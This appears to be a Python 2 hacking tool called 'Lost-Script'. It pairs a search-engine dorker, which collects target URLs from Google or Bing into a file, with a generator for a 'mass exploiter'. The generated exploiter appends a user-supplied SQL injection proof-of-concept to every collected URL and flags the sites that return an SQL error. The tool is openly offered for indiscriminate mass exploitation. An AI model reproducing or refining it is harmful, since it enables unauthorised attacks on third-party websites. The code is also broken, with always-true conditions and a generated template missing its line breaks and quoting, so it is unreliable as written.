import requests, re
from bs4 import BeautifulSoup
import sys
print''' --L O S T - S C R I P--
	          by EthicalCodeFvck
Version : 1.5
Grad : not priv8
New update :
you must type by example : python Lost-Script.py dorker 
for launch the script 
 ''' 
print '''
[*] Dorker (dorker)
[*] Make your own exploiter (myoe)
[?] For more information enter : ?
'''
if len(sys.argv) != 2 or sys.argv[1] == "dorker" or "Dorker" :
	print'''
	Google : http://google.com/search
	Bing : http://bing.com/search
	[?] Write the link you want
	'''
	domain = raw_input("Write the link of google or bing or other : ")
	dork = raw_input("Your Dork :") 
	log = { 'q' : dork, 'start' : '0' } 
	useragent = { 'User-agent' : 'Mozilla/11.0' } 
	r = requests.get(domain, 
	params = log, headers = useragent) 
	soup = BeautifulSoup(r.text, 'html.parser') 
	h3tags = soup.find_all( 'h3', class_='r' ) 
	for h3 in h3tags:
	    	try:
        		print(re.search('url\?q=(.+?)\&sa', 
		h3.a['href']).group(1))
        		file = open("Rez.txt", "a")
        		file.write(re.search('url\?q=(.+?)\&sa', 
		h3.a['href']).group(1))
        		file.close()
    		except:
        		continue
if len(sys.argv) != 2 or sys.argv[1] == "myoe" :
    print'''
    -= M  Y  O  E  S  C  R  I  P  T =-
    Version : 0.1
    Grad : Not Priv8
    '''
    error = raw_input("For check if vulnerable or not enter a word like in sql injection (You have an error in you SQL syntax) : ")
    poc = raw_input("poc of your exploit : ")
    template = "import urllibimport sysimport urllib.requestprint('L  O  S  T-S  C  R  I  P  T masse exploiter by MYOE')list = raw_input('name list (ex. Rez.txt) : ')file = open(list, 'r')request = urllib.request.urlopen(file + "+poc+")body = request.read()request = body.decode('utf-8')if "+error+" in request:	print('[+] Vuln :) ')elif ,"+error+" in request:	print('[-] Not Vuln :( ')"
    file = open("myoe.py", "a")
    file.write(template)
    file.close()
if len(sys.argv) != 2 or sys.argv[1] == "?" :
    print'''
    [+]The dorker allows you to do a mass search
    [+]MYOE bot allows you to create your own mass exploitation script
    '''
if len(sys.argv) != 2 or sys.argv[1] != "dorker" or "myoe" or "?" :
    print("[×] Error thank enter : dorker , myoe or ? for more information")

    
